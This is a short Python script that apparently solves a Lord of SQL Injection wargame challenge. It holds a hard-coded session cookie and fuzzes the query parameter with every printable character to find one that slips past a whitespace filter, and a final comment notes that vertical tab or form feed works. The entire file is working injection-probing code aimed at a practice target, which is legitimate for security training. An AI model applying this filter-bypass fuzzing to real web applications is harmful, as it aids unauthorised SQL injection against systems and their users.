import requests, string

cookies = { "PHPSESSID": "mb1phjh2magaoc9qipl63b4gs6" }

url = "https://los.rubiya.kr/chall/giant_18a08c3be1d1753de0cb157703f75a5e.php"

params = { "shit": "0" }

r = requests.get(url, params=params, cookies=cookies)
default_result = r.text[64:]

for c in string.printable:
  params = {"shit": c}
  r = requests.get(url, params=params, cookies=cookies)
  current_text = r.text[64:]
  if current_text != default_result:
    print(ord(c))
    print(r.text)
    print("<<<<<<<<<<<<================>>>>>>>>>>>>>>>>>>.")

# shit = \x0b means \v or \x0c means \f